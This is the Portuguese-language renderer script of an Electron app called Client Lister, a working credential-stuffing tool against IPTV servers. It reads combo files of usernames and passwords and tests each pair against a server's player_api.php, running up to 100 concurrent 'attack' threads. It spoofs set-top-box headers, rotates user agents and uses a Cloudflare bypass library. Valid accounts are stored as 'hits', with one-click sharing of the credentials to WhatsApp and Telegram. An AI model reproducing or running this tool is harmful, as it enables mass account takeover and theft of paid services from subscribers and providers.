const { ipcRenderer } = require('electron');
const axios = require('axios');
const moment = require('moment');
const fs = require('fs');
const path = require('path');
const CloudflareBypasser = require('cloudflare-bypasser');

// Elementos da interface
const minimizeButton = document.getElementById('minimize-button');
const maximizeButton = document.getElementById('maximize-button');
const closeButton = document.getElementById('close-button');
const navButtons = document.querySelectorAll('.nav-button');
const pages = document.querySelectorAll('.page');
const startButton = document.getElementById('start-scan');
const serverInput = document.getElementById('server');
const comboFileInput = document.getElementById('combo-file');
const numBotsInput = document.getElementById('num-bots');
const attackTypeInputs = document.querySelectorAll('input[name="attack-type"]');
const categoriesInputs = document.querySelectorAll('input[name="categories"]');
const nicknameInput = document.getElementById('nickname');
const hitsCount = document.getElementById('hits-count');
const cpmCount = document.getElementById('cpm-count');
const progressText = document.getElementById('progress');
const progressBar = document.querySelector('.progress-bar');
const resultsList = document.getElementById('results-list');
const hitsList = document.getElementById('hits-list');
const hitsSearch = document.getElementById('hits-search');
const hitsSort = document.getElementById('hits-sort');

// Novos elementos do Scanner dinâmico
const scanConfig = document.querySelector('.scan-config');
const scanStatusResults = document.querySelector('.scan-status-results');
const abortButton = document.getElementById('abort-scan');

// Variáveis globais
let isScanning = false;
let hits = 0;
let cpm = 0;
let startTime = null;
let comboLines = [];
let currentIndex = 0;
let activeThreads = 0;
let maxThreads = 15;
let retryCount = 0;
let maxRetries = 3;
let totalLines = 0;
let savedHits = [];

// Elementos do popup de update
const updatePopupOverlay = document.getElementById('update-popup-overlay');
const updateNowButton = document.getElementById('update-now-button');
const updateLaterButton = document.getElementById('update-later-button');

// Elementos do popup de boas-vindas
const welcomePopupOverlay = document.getElementById('welcome-popup-overlay');
const closeWelcomePopupButton = document.getElementById('close-welcome-popup');

// URL do seu repositório no GitHub
const githubRepoUrl = 'https://api.github.com/repos/TypeXZY/iptv-checker/releases/latest';
const currentVersion = '1.0.0'; // <-- Mantenha esta versão atualizada manualmente

let cf = new CloudflareBypasser();

// Headers do script Python (adaptados para JS)
const PYTHON_HEADERS = {
    'Cookie': 'stb_lang=en; timezone=Europe%2FIstanbul;',
    'X-User-Agent': 'Model: MAG254; Link: Ethernet',
    'Connection': 'Keep-Alive',
    'Accept-Encoding': 'gzip, deflate',
    'Accept': 'application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3'
};

// --- Variáveis e Elementos do Tour ---
let tourSteps = [];
let currentStepIndex = 0;

// Função para definir os passos do tour
function defineTourSteps() {
    tourSteps = [
        {
            title: 'Bem-vindo ao Client Lister!',
            content: `
                <p>Obrigado por escolher o Client Lister! Este rápido tour irá te mostrar as principais funcionalidades.</p>
                <ul class="welcome-tips">
                    <li><i class="fas fa-check"></i> Selecione um arquivo combo válido</li>
                    <li><i class="fas fa-check"></i> Configure o servidor e número de bots</li>
                    <li><i class="fas fa-check"></i> Escolha o tipo de ataque desejado</li>
                    <li><i class="fas fa-check"></i> Clique em "Iniciar Scan" para começar</li>
                </ul>
            `,
            page: null // Não associado a uma página específica inicialmente
        },
        {
            title: 'A Página Scanner',
            content: 'Aqui você configura e inicia a busca por hits. Selecione o arquivo combo, o servidor, número de bots e o tipo de ataque.',
            page: 'scan' // Associa ao elemento com id 'scan-page'
        },
        {
            title: 'Os Hits Encontrados',
            content: 'Nesta página, você verá a lista de hits encontrados. Pode buscar e ordenar os resultados, além de compartilhar!',
            page: 'hits' // Associa ao elemento com id 'hits-page'
        },
        {
            title: 'Configurações',
            content: 'Explore as configurações para personalizar sua experiência com o Client Lister.',
            page: 'settings' // Associa ao elemento com id 'settings-page'
        },
        {
            title: 'Tour Concluído!',
            content: 'Pronto! Agora você já conhece as principais áreas do Client Lister. Comece a escanear e encontrar hits!',
            page: null
        }
    ];
}

// Função para mostrar o popup do tour
function showTourPopup(step) {
    const buttons = [];

    // Botão Pular Tour
    buttons.push({
        text: 'Pular Tour',
        class: 'secondary',
        onClick: () => endTour()
    });

    // Botão Próximo ou Começar
    if (currentStepIndex < tourSteps.length - 1) {
        buttons.push({
            text: 'Próximo',
            class: 'primary',
            onClick: () => nextTourStep()
        });
    } else {
        buttons.push({
            text: 'Começar!',
            class: 'primary',
            onClick: () => endTour()
        });
    }

    showPopup(step.title, step.content, buttons); // Passa o HTML do conteúdo diretamente

    // Navega para a página correspondente ao passo, se houver
    if (step.page) {
        navigateToPage(step.page);
    }

    // Animação para os itens da lista no primeiro popup
    if (currentStepIndex === 0) {
        const welcomeTips = document.querySelectorAll('.popup-body .welcome-tips li');
        welcomeTips.forEach((item, index) => {
            setTimeout(() => {
                item.style.animation = 'slideInRight 0.5s ease forwards';
            }, index * 100); // Atraso para animar sequencialmente
        });
    }
}

// Função para navegar para a próxima etapa do tour
function nextTourStep() {
    // Antes de ir para o próximo, esconde o popup atual
    hidePopup();
    currentStepIndex++;
    if (currentStepIndex < tourSteps.length) {
        // Pequeno delay para a animação de fechamento do popup anterior
        setTimeout(() => {
            showTourPopup(tourSteps[currentStepIndex]);
        }, 300); // Tempo igual à duração da animação de fechamento do popup
    } else {
        endTour();
    }
}

// Função para finalizar o tour
async function endTour() {
    hidePopup(); // Assume que hidePopup existe para fechar qualquer popup aberto
    currentStepIndex = 0; // Reseta o índice do tour

    // Marcar que o tour já foi visto (salvar no settings)
    const settings = await ipcRenderer.invoke('get-settings');
    if (settings) {
        settings.hasSeenTour = true;
        await ipcRenderer.invoke('set-settings', settings);
    }

    // Navega para a página inicial (Scanner) após o tour
    navigateToPage('scan');
}

// Função auxiliar para navegar entre páginas (pode já existir ou precisar ser criada)
function navigateToPage(pageId) {
    // Remove a classe 'active' de todas as páginas e botões de navegação
    pages.forEach(p => p.classList.remove('active'));
    navButtons.forEach(btn => btn.classList.remove('active'));

    // Adiciona a classe 'active' na página e botão correspondentes
    document.getElementById(`${pageId}-page`).classList.add('active');
    const targetNavButton = document.querySelector(`.nav-button[data-page='${pageId}']`);
    if (targetNavButton) {
        targetNavButton.classList.add('active');
    }

    // Se for a página de hits, carrega os hits
    if (pageId === 'hits') {
        loadHits(); // Assume que loadHits existe
    }
}

// Eventos dos botões da janela
minimizeButton.addEventListener('click', () => {
    ipcRenderer.send('minimize-window');
});

maximizeButton.addEventListener('click', () => {
    ipcRenderer.send('maximize-window');
});

closeButton.addEventListener('click', () => {
    ipcRenderer.send('close-window');
});

// Navegação
navButtons.forEach(button => {
    button.addEventListener('click', () => {
        const targetPage = button.dataset.page;
        navButtons.forEach(btn => btn.classList.remove('active'));
        pages.forEach(page => page.classList.remove('active'));
        button.classList.add('active');
        document.getElementById(`${targetPage}-page`).classList.add('active');
        
        if (targetPage === 'hits') {
            loadHits();
        } else if (targetPage === 'about') {
            populateAboutPage();
        }
    });
});

// Carregar configurações salvas
async function loadSettings() {
    const settings = await ipcRenderer.invoke('get-settings');
    if (settings) {
        serverInput.value = settings.server || '';
        numBotsInput.value = settings.numBots || 15;
        nicknameInput.value = settings.nickname || '';
        if (settings.attackType) {
            document.querySelector(`input[name="attack-type"][value="${settings.attackType}"]`).checked = true;
        }
        if (settings.categories) {
            document.querySelector(`input[name="categories"][value="${settings.categories}"]`).checked = true;
        }

        // Verifica se é a primeira execução E se o tour já foi visto
        if (!settings.hasRunBefore && !settings.hasSeenTour) {
             // Não mostra o popup de boas-vindas antigo, o tour cuidará disso
        } else if (!settings.hasRunBefore && settings.hasSeenTour) {
             // Caso incomum, mas garante que a flag seja setada
             settings.hasRunBefore = true;
             await ipcRenderer.invoke('set-settings', settings); // Salva a flag
        } else if (settings.hasRunBefore && !settings.hasSeenTour) {
             // Já rodou antes mas não viu o tour (ex: atualização), iniciar tour
             startTour();
        }
        
        // Marca que já rodou uma vez se ainda não estiver marcado
        if (!settings.hasRunBefore) {
             settings.hasRunBefore = true;
             await ipcRenderer.invoke('set-settings', settings); // Salva a flag
        }

    } else {
        // Se não houver settings, é a primeira execução, iniciar tour
        startTour();
        // Cria settings iniciais com as flags hasRunBefore e hasSeenTour como false
        const initialSettings = {
            server: '',
            numBots: 15,
            attackType: '1',
            categories: '0',
            nickname: '',
            hasRunBefore: false, // Será true após o tour
            hasSeenTour: false   // Será true após o tour
        };
        await ipcRenderer.invoke('set-settings', initialSettings); // Salva as settings iniciais
    }
}

// Salvar configurações
let settingsChanged = false; // Nova flag para rastrear mudanças

async function saveSettings() {
    const currentSettings = {
        server: serverInput.value,
        numBots: parseInt(numBotsInput.value),
        attackType: document.querySelector('input[name="attack-type"]:checked').value,
        categories: document.querySelector('input[name="categories"]:checked').value,
        nickname: nicknameInput.value,
        // Garante que a flag hasRunBefore seja mantida
        hasRunBefore: (await ipcRenderer.invoke('get-settings'))?.hasRunBefore || false,
        hasSeenTour: (await ipcRenderer.invoke('get-settings'))?.hasSeenTour || false // Garante que a flag hasSeenTour seja mantida
    };

    const savedSettings = await ipcRenderer.invoke('get-settings');

    // Compara as configurações atuais com as salvas para detectar mudanças
    const changesDetected = JSON.stringify(currentSettings) !== JSON.stringify(savedSettings);

    if (changesDetected) {
        await ipcRenderer.invoke('set-settings', currentSettings);
        console.log('Configurações salvas.'); // Log para debug
        // showToast('Configurações salvas!', 'success'); // Removido para auto-save silencioso
        settingsChanged = false; // Reseta a flag após salvar
    } else {
        console.log('Nenhuma mudança nas configurações para salvar.'); // Log para debug
    }
}

// Marcar configurações como alteradas quando um input muda
function markSettingsAsChanged() {
    settingsChanged = true;
    console.log('Configurações marcadas como alteradas.'); // Log para debug
}

// Eventos para salvar configurações (agora apenas marcam como alterado)
serverInput.addEventListener('change', markSettingsAsChanged);
numBotsInput.addEventListener('change', markSettingsAsChanged);
nicknameInput.addEventListener('change', markSettingsAsChanged);
attackTypeInputs.forEach(input => input.addEventListener('change', markSettingsAsChanged));
categoriesInputs.forEach(input => input.addEventListener('change', markSettingsAsChanged));

// Atualizar estatísticas
function updateStats() {
    const elapsedTime = (Date.now() - startTime) / 1000;
    const progress = (currentIndex / totalLines) * 100;
    cpm = Math.round((currentIndex / elapsedTime) * 60);
    
    hitsCount.textContent = hits;
    cpmCount.textContent = cpm;
    progressText.textContent = `${Math.round(progress)}%`;
    progressBar.style.width = `${progress}%`;
    progressBar.setAttribute('data-progress', `${Math.round(progress)}%`);
}

// Adicionar resultado
function addResult(hit) {
    const resultItem = document.createElement('div');
    resultItem.className = 'result-item';
    
    const attackType = document.querySelector('input[name="attack-type"]:checked').value;
    const badge = getAttackBadge(attackType);
    
    resultItem.innerHTML = `
        <div class="hit-info">
            <div class="hit-details">
                <strong>Host:</strong> ${hit.host}<br>
                <strong>User:</strong> ${hit.user}<br>
                <strong>Password:</strong> ${hit.password}<br>
                <strong>Expiração:</strong> ${hit.expiration || 'N/A'}<br>
                <strong>Status:</strong> ${hit.status || 'N/A'}<br>
                <strong>Conexões:</strong> ${hit.activeCons}/${hit.maxCons}<br>
                <strong>Mensagem:</strong> ${hit.message || 'N/A'}<br>
                ${hit.categories ? `<strong>Categorias:</strong> ${hit.categories}<br>` : ''}
            </div>
            <div class="hit-actions">
                ${badge}
                <button class="share-hit-button" onclick="shareHit(${JSON.stringify(hit)})">
                    <i class="fas fa-share-alt"></i> Compartilhar
                </button>
            </div>
        </div>
    `;
    
    resultsList.insertBefore(resultItem, resultsList.firstChild);
}

// Obter badge do tipo de ataque
function getAttackBadge(attackType) {
    const badges = {
        '1': '<span class="hit-badge attack-simple">Simple Attack</span>',
        '2': '<span class="hit-badge attack-ultra">Ultra Attack</span>',
        '3': '<span class="hit-badge attack-god">God Attack</span>',
        '4': '<span class="hit-badge attack-demon">Demon Attack</span>',
        '5': '<span class="hit-badge attack-ssjblue">SsjBlue Attack</span>'
    };
    return badges[attackType] || badges['1'];
}

// Calcular CPM
function calculateCPM() {
    if (!startTime) return 0;
    const elapsedMinutes = (Date.now() - startTime) / 1000 / 60;
    return Math.round(currentIndex / elapsedMinutes);
}

// Obter headers baseado no tipo de ataque
function getHeaders(attackType) {
    const headers = {
        '1': { // Speedster (CPU)
            'User-Agent': getRandomUserAgent(),
            'Accept': '*/*',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip'
        },
        '2': { // Powerhouse (CPU+RAM)
            'User-Agent': getRandomUserAgent(),
            'Accept': '*/*',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        },
        '3': { // Divinity (CPU+RAM+GPU)
            'User-Agent': getRandomUserAgent(),
            'Accept': '*/*',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'X-Requested-With': 'XMLHttpRequest'
        },
        '4': { // Abyss (Máximo)
            'User-Agent': getRandomUserAgent(),
            'Accept': '*/*',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'X-Requested-With': 'XMLHttpRequest',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty'
        },
        '5': { // Apex Saiyan (Customizado)
            'User-Agent': getRandomUserAgent(),
            'Accept': '*/*',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip'
        }
    };
    return headers[attackType] || headers['1'];
}

// Obter User-Agent aleatório
function getRandomUserAgent() {
    const userAgents = {
        android: [
            'Mozilla/5.0 (Linux; Android 10; SM-G975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36'
        ],
        iphone: [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/128.0.345285827 Mobile/15E148 Safari/604.1'
        ],
        windows: [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/85.0'
        ],
        tablet: [
            'Mozilla/5.0 (Linux; Android 8.0; SM-T590) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Safari/537.36',
            'Mozilla/5.0 (iPad; CPU OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
        ],
        desktop: [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/605.1.15'
        ]
    };

    const deviceTypes = ['android', 'iphone', 'windows', 'tablet', 'desktop'];
    const randomDevice = deviceTypes[Math.floor(Math.random() * deviceTypes.length)];
    const deviceAgents = userAgents[randomDevice];
    return deviceAgents[Math.floor(Math.random() * deviceAgents.length)];
}

// Processar linha do combo
async function processComboLine(line) {
    if (!isScanning) return;
    if (!line.trim()) return;
    
    const [user, password] = line.split(':');
    if (!user || !password) return;
    
    const server = serverInput.value;
    const attackType = document.querySelector('input[name="attack-type"]:checked').value;
    const categories = document.querySelector('input[name="categories"]:checked').value;
    
    try {
        // Primeiro verifica o status do usuário
        const response = await cf.request({
            url: `http://${server}/player_api.php?username=${user}&password=${password}`,
            headers: PYTHON_HEADERS,
            timeout: getTimeout(attackType),
            resolveWithFullResponse: true,
            simple: false,
            followRedirect: false,
            strictSSL: false
        });
        
        let responseData;
        try {
            responseData = JSON.parse(response.body);
        } catch (parseError) {
            console.error('Erro ao parsear resposta JSON:', parseError);
            if (response.body && (response.body.includes('Cloudflare') || response.body.includes('jschl'))) {
                console.log('Desafio Cloudflare detectado:', response.body.substring(0, 200) + '...');
            } else {
                console.log('Resposta inesperada:', response.body);
            }
            return;
        }
        
        if (responseData && responseData.user_info) {
            const userInfo = responseData.user_info;
            
            if (userInfo.status === 'Active') {
                // Se for hit, busca informações adicionais
                let categoriesInfo = null;
                if (categories === '1') {
                    try {
                        const catResponse = await cf.request({
                            url: `http://${server}/player_api.php?username=${user}&password=${password}&action=get_live_categories`,
                            headers: PYTHON_HEADERS,
                            timeout: getTimeout(attackType),
                            resolveWithFullResponse: true,
                            simple: false,
                            followRedirect: false,
                            strictSSL: false
                        });
                        
                        const catData = JSON.parse(catResponse.body);
                        if (catData && Array.isArray(catData)) {
                            categoriesInfo = catData.map(cat => cat.category_name).join(', ');
                        }
                    } catch (catError) {
                        console.error('Erro ao buscar categorias:', catError);
                    }
                }
                
                const hitData = {
                    host: server,
                    user: user,
                    password: password,
                    expiration: userInfo.exp_date !== null ? moment.unix(userInfo.exp_date).format('DD.MMM.YYYY') : 'N/A',
                    status: userInfo.status,
                    activeCons: userInfo.active_cons || 0,
                    maxCons: userInfo.max_connections || 0,
                    message: userInfo.message || 'Hit encontrado!',
                    categories: categoriesInfo,
                    timestamp: new Date().toISOString(),
                    attackType: attackType
                };
                
                hits++;
                addResult(hitData);
                saveHit(hitData);
                savedHits.push(hitData);
                
                // Log de sucesso
                console.log(`Hit encontrado para ${user}:${password}`);
            } else {
                console.log(`Conta inativa para ${user}:${password}`);
            }
        } else if (responseData && responseData.message) {
            console.log(`API retornou mensagem: ${responseData.message} para ${user}:${password}`);
        }
    } catch (error) {
        console.error(`Erro na requisição para ${user}:${password}:`, error);
        if (isScanning && retryCount < getMaxRetries(attackType)) {
            retryCount++;
            console.log(`Tentando retry para ${user}:${password} (${retryCount}/${getMaxRetries(attackType)})`);
            await new Promise(resolve => setTimeout(resolve, getRetryDelay(attackType)));
            return processComboLine(line);
        }
        retryCount = 0;
    }
}

// Obter timeout baseado no modo
function getTimeout(attackType) {
    const timeouts = {
        '1': 15000, // Speedster
        '2': 10000, // Powerhouse
        '3': 8000,  // Divinity
        '4': 5000,  // Abyss
        '5': 15000  // Apex Saiyan
    };
    return timeouts[attackType] || 15000;
}

// Obter número máximo de retries baseado no modo
function getMaxRetries(attackType) {
    const retries = {
        '1': 3,  // Speedster
        '2': 2,  // Powerhouse
        '3': 2,  // Divinity
        '4': 1,  // Abyss
        '5': 3   // Apex Saiyan
    };
    return retries[attackType] || 3;
}

// Obter delay entre retries baseado no modo
function getRetryDelay(attackType) {
    const delays = {
        '1': 1000,  // Speedster
        '2': 500,   // Powerhouse
        '3': 300,   // Divinity
        '4': 200,   // Abyss
        '5': 1000   // Apex Saiyan
    };
    return delays[attackType] || 1000;
}

// Obter categorias
async function getCategories(availableChannels) {
    if (!availableChannels || availableChannels.length === 0) return '';
    
    const categories = availableChannels.map(cat => cat.category_name).join(', ');
    return categories;
}

// Salvar hit
function saveHit(hit) {
    const hitsDir = path.join(__dirname, 'hits');
    if (!fs.existsSync(hitsDir)) {
        fs.mkdirSync(hitsDir);
    }
    
    const timestamp = moment().format('YYYY-MM-DD_HH-mm-ss');
    const filename = path.join(hitsDir, `hits_${timestamp}.txt`);
    
    const hitInfo = `
Host: ${hit.host}
User: ${hit.user}
Password: ${hit.password}
Expiração: ${hit.expiration}
Status: ${hit.status}
Conexões: ${hit.connections}
Mensagem: ${hit.message}
Categorias: ${hit.categories}
Data: ${hit.timestamp}
----------------------------------------
`;
    
    fs.appendFileSync(filename, hitInfo);
}

// Carregar hits salvos
function loadHits() {
    const hitsDir = path.join(__dirname, 'hits');
    if (!fs.existsSync(hitsDir)) {
        return;
    }

    const files = fs.readdirSync(hitsDir);
    savedHits = [];

    files.forEach(file => {
        if (file.endsWith('.txt')) {
            const content = fs.readFileSync(path.join(hitsDir, file), 'utf8');
            const hits = content.split('----------------------------------------').filter(hit => hit.trim());

            hits.forEach(hit => {
                const lines = hit.trim().split('\n');
                const hitData = {};

                lines.forEach(line => {
                    const [key, value] = line.split(':').map(s => s.trim());
                    if (key && value) {
                        hitData[key.toLowerCase()] = value;
                    }
                });

                if (Object.keys(hitData).length > 0) {
                    savedHits.push(hitData);
                }
            });
        }
    });

    displayHits();
}

// Exibir hits
function displayHits() {
    hitsList.innerHTML = '';
    
    const searchTerm = hitsSearch.value.toLowerCase();
    const sortBy = hitsSort.value;
    
    let filteredHits = savedHits.filter(hit => {
        // Garante que hit e seus valores existam antes de chamar toString()
        return Object.values(hit || {}).some(value => 
            value !== null && value !== undefined && value.toString().toLowerCase().includes(searchTerm)
        );
    });
    
    switch (sortBy) {
        case 'newest':
            filteredHits.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp)); // Usar timestamp para ordenação correta
            break;
        case 'oldest':
            filteredHits.sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp)); // Usar timestamp para ordenação correta
            break;
        case 'server':
            filteredHits.sort((a, b) => (a.host || '').localeCompare(b.host || '')); // Adicionar fallback para evitar erros se host for undefined
            break;
    }
    
    filteredHits.forEach(hit => {
        const hitCard = document.createElement('div');
        hitCard.className = 'hit-card';
        
        // Adiciona o botão de compartilhar aqui, similar ao addResult
        hitCard.innerHTML = `
            <div class="hit-card-header">
                <span class="hit-server">${hit.host || 'N/A'}</span>
                <span class="hit-date">${hit.data || hit.timestamp ? moment(hit.data || hit.timestamp).format('DD.MMM.YYYY HH:mm') : 'N/A'}</span>
            </div>
            <div class="hit-card-body">
                <div class="hit-info">
                    <strong>User:</strong> ${hit.user || 'N/A'}<br>
                    <strong>Password:</strong> ${hit.password || 'N/A'}<br>
                    <strong>Expiração:</strong> ${hit.expiração || hit.expiration || 'N/A'}<br>
                    <strong>Status:</strong> ${hit.status || 'N/A'}<br>
                    <strong>Conexões:</strong> ${hit.conexões !== undefined ? hit.conexões : (hit.activeCons !== undefined ? `${hit.activeCons}/${hit.maxCons}` : 'N/A')}<br>
                </div>
                ${hit.categorias || hit.categories ? `
                <div class="hit-categories">
                    <strong>Categorias:</strong><br>
                    ${hit.categorias || hit.categories}
                </div>
                ` : ''}
            </div>
            <div class="hit-card-footer">
                 <button class="share-hit-button" onclick='shareHit(${JSON.stringify(hit)})>
                     <i class="fas fa-share-alt"></i> Compartilhar
                 </button>
            </div>
        `;
        
        hitsList.appendChild(hitCard);
    });
}

// Eventos de busca e ordenação
hitsSearch.addEventListener('input', displayHits);
hitsSort.addEventListener('change', displayHits);

// Iniciar scan
async function startScan() {
    if (isScanning) return;
    
    const file = comboFileInput.files[0];
    if (!file) {
        alert('Selecione um arquivo combo!');
        return;
    }
    
    if (!serverInput.value) {
        alert('Digite o endereço do servidor!');
        return;
    }
    
    isScanning = true;
    updateButtonState();
    hits = 0;
    currentIndex = 0;
    startTime = Date.now();
    
    try {
        const content = await fs.promises.readFile(file.path, 'utf8');
        comboLines = content.split('\n').filter(line => line.trim());
        totalLines = comboLines.length;
        
        const attackType = document.querySelector('input[name="attack-type"]:checked').value;
        maxThreads = getMaxThreads(attackType);
        activeThreads = 0;
        
        while (currentIndex < comboLines.length && isScanning) {
            if (activeThreads < maxThreads) {
                const line = comboLines[currentIndex];
                currentIndex++;
                activeThreads++;
                
                processComboLine(line).then(() => {
                    activeThreads--;
                    updateStats();
                });
            } else {
                await new Promise(resolve => setTimeout(resolve, getThreadDelay(attackType)));
            }
        }
    } catch (error) {
        console.error('Erro ao ler arquivo:', error);
        alert('Erro ao ler o arquivo combo!');
    } finally {
        isScanning = false;
        updateButtonState();
        updateStats();
    }
}

// Obter número máximo de threads baseado no modo
function getMaxThreads(attackType) {
    const threads = {
        '1': 15,  // Speedster
        '2': 30,  // Powerhouse
        '3': 50,  // Divinity
        '4': 100, // Abyss
        '5': 15   // Apex Saiyan
    };
    return threads[attackType] || 15;
}

// Obter delay entre threads baseado no modo
function getThreadDelay(attackType) {
    const delays = {
        '1': 100,  // Speedster
        '2': 50,   // Powerhouse
        '3': 20,   // Divinity
        '4': 10,   // Abyss
        '5': 100   // Apex Saiyan
    };
    return delays[attackType] || 100;
}

// Atualizar CPM a cada segundo
setInterval(() => {
    if (isScanning) {
        cpm = calculateCPM();
        updateStats();
    }
}, 1000);

// Carregar configurações ao iniciar
loadSettings();
checkforUpdates(); // Verifica updates ao iniciar
updateButtonState(); // Inicializa o estado do botão

// Função para verificar updates no GitHub
async function checkforUpdates() {
    try {
        const response = await axios.get(githubRepoUrl);
        const latestRelease = response.data;
        const latestVersion = latestRelease.tag_name; // Assume que a tag é a versão

        if (latestVersion > currentVersion) {
            showUpdatePopup();
        }

    } catch (error) {
        console.error('Erro ao verificar updates:', error);
        // Ignora erros de verificação de update para não travar a aplicação
    }
}

// Função para exibir o popup de update
function showUpdatePopup() {
    updatePopupOverlay.classList.add('visible');
}

// Função para esconder o popup de update
function hideUpdatePopup() {
    updatePopupOverlay.classList.remove('visible');
}

// Eventos dos botões do popup
updateNowButton.addEventListener('click', () => {
    hideUpdatePopup();
    ipcRenderer.send('open-external', 'https://github.com/TypeXZY/iptv-checker/releases/latest'); // Abre a página de releases
});

updateLaterButton.addEventListener('click', () => {
    hideUpdatePopup();
});

// Evento do botão de início/abortar
startButton.addEventListener('click', () => {
    if (isScanning) {
        // Se estiver escaneando, aborta
        isScanning = false;
    } else {
        // Se não estiver escaneando, inicia
        startScan();
    }
});

// Novo evento para o botão de abortar (agora separado)
abortButton.addEventListener('click', () => {
    if (isScanning) {
        isScanning = false;
    }
});

// Função para atualizar o estado do botão (texto e se está disabled) E o layout do scanner
function updateButtonState() {
    if (isScanning) {
        startButton.style.display = 'none';
        abortButton.style.display = 'block';
        scanConfig.classList.add('hidden'); // Esconde a configuração
        scanStatusResults.style.display = 'flex'; // Mostra status/resultados
    } else {
        startButton.textContent = 'Iniciar Scan'; // Garante texto correto ao parar
        startButton.disabled = false; // Habilita
        startButton.style.display = 'block';
        abortButton.style.display = 'none';
        scanConfig.classList.remove('hidden'); // Mostra a configuração
        // A lista de resultados pode ser limpa ou mantida, dependendo da preferência
        // resultsList.innerHTML = ''; // Opcional: limpar resultados anteriores ao parar
    }
}

// Sistema de Popups
const popupOverlay = document.createElement('div');
popupOverlay.className = 'popup-overlay';
document.body.appendChild(popupOverlay);

function showPopup(title, content, buttons = []) {
    const popup = document.createElement('div');
    popup.className = 'popup';
    
    const header = document.createElement('div');
    header.className = 'popup-header';
    header.innerHTML = `
        <h3>${title}</h3>
        <button class="close-popup">&times;</button>
    `;
    
    const body = document.createElement('div');
    body.className = 'popup-body';
    body.innerHTML = content;
    
    const footer = document.createElement('div');
    footer.className = 'popup-footer';
    
    buttons.forEach(btn => {
        const button = document.createElement('button');
        button.className = `popup-button ${btn.class || ''}`;
        button.textContent = btn.text;
        button.onclick = () => {
            btn.onClick();
            popupOverlay.classList.remove('visible');
            popup.remove();
        };
        footer.appendChild(button);
    });
    
    popup.appendChild(header);
    popup.appendChild(body);
    popup.appendChild(footer);
    
    popupOverlay.appendChild(popup);
    popupOverlay.classList.add('visible');
    
    popup.querySelector('.close-popup').onclick = () => {
        popupOverlay.classList.remove('visible');
        popup.remove();
    };
}

// Sistema de Compartilhamento
async function shareHit(hit) {
    const shareOptions = [
        {
            text: 'WhatsApp',
            icon: 'fab fa-whatsapp',
            onClick: () => shareToWhatsApp(hit)
        },
        {
            text: 'Telegram',
            icon: 'fab fa-telegram',
            onClick: () => shareToTelegram(hit)
        },
        {
            text: 'Copiar Link',
            icon: 'fas fa-copy',
            onClick: () => copyToClipboard(hit)
        }
    ];
    
    showPopup('Compartilhar Hit', `
        <div class="share-options">
            ${shareOptions.map(opt => `
                <button class="share-button ${opt.icon}">
                    <i class="${opt.icon}"></i>
                    ${opt.text}
                </button>
            `).join('')}
        </div>
    `, [
        {
            text: 'Fechar',
            class: 'secondary',
            onClick: () => {}
        }
    ]);
    
    // Adiciona eventos aos botões de compartilhamento
    document.querySelectorAll('.share-button').forEach((btn, index) => {
        btn.onclick = shareOptions[index].onClick;
    });
}

async function shareToWhatsApp(hit) {
    const text = formatHitForSharing(hit);
    const url = `https://wa.me/?text=${encodeURIComponent(text)}`;
    window.open(url, '_blank');
}

async function shareToTelegram(hit) {
    const text = formatHitForSharing(hit);
    const url = `https://t.me/share/url?url=${encodeURIComponent(window.location.href)}&text=${encodeURIComponent(text)}`;
    window.open(url, '_blank');
}

async function copyToClipboard(hit) {
    const text = formatHitForSharing(hit);
    await navigator.clipboard.writeText(text);
    showToast('Link copiado para a área de transferência!');
}

function formatHitForSharing(hit) {
    return `
🎯 *Hit Encontrado!*
━━━━━━━━━━━━━━━━━━━━
🌐 *Host:* ${hit.host}
👤 *User:* ${hit.user}
🔑 *Pass:* ${hit.password}
📅 *Expiração:* ${hit.expiration}
📊 *Status:* ${hit.status}
🔌 *Conexões:* ${hit.activeCons}/${hit.maxCons}
${hit.categories ? `📺 *Categorias:* ${hit.categories}` : ''}
━━━━━━━━━━━━━━━━━━━━
💻 *By:* ${nicknameInput.value || 'IPTV Checker'}
    `.trim();
}

// Sistema de Toast Notifications
function showToast(message, type = 'info') {
    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;
    toast.textContent = message;
    
    document.body.appendChild(toast);
    
    setTimeout(() => {
        toast.classList.add('show');
    }, 100);
    
    setTimeout(() => {
        toast.classList.remove('show');
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

// Sistema de Layout Responsivo
